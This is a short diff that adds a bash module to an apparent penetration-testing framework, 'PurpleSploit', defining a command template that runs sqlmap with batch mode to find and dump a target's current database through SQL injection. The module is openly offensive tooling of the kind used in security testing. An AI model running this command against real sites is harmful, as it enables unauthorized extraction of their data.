@@ -1,0 +1,13 @@
+#!/bin/bash
+# SQLMap Database Dump Module
+
+MODULE_NAME="web/sqlmap/database_dump"
+MODULE_CATEGORY="web"
+MODULE_DESCRIPTION="Dump current database via SQL injection"
+MODULE_AUTHOR="PurpleSploit Team"
+MODULE_TOOL="sqlmap"
+
+REQUIRED_VARS="TARGET_URL"
+OPTIONAL_VARS="THREADS:10"
+
+COMMAND_TEMPLATE="sqlmap -u \${TARGET_URL} --batch --threads=\${THREADS} --current-db --dump"
